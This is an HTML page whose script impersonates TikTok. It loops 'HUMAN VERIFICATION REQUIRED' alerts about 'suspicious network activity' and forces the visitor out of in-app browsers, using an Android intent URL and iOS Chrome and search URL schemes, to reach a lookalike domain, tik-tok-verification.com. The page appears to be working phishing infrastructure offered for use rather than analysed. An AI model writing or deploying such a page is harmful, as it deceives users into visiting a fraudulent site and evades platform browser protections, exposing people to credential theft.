<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    function forceBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: Intent-based browser forcing
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: The "Double-Tap" Protocol
            // We fire the Chrome scheme which iOS usually hands off to the system picker
            window.location.href = "googlechromes://" + urlNoProt;
            
            // Immediately follow with the "Search-Relay" that worked before
            // but we use the 'http' version to avoid the "HTTPS-Only" block
            setTimeout(() => {
                window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
            }, 50);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // Fire BEFORE the alert
        forceBreakout();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Fire IMMEDIATELY after OK
                forceBreakout();

                setTimeout(securityLogic, 400);
            }
        }, 400);
    }

    window.onload = securityLogic;
</script>

</body>
</html>
